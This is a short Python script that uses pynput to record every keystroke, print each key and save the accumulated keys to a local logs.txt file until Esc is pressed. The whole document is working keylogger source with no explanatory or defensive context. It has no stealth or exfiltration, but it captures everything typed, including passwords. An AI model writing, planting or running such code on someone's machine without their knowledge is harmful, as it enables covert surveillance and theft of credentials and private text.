from pynput.keyboard import Key, Listener

k = []


def on_press(key):
    k.append(key)
    write_1(k)
    print(key)


def write_1(var):
    open("logs.txt", "w")
    with open("logs.txt", "a") as f:
        new_var = str(var).replace("'", '')
        f.write(new_var)
        f.write("  ")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
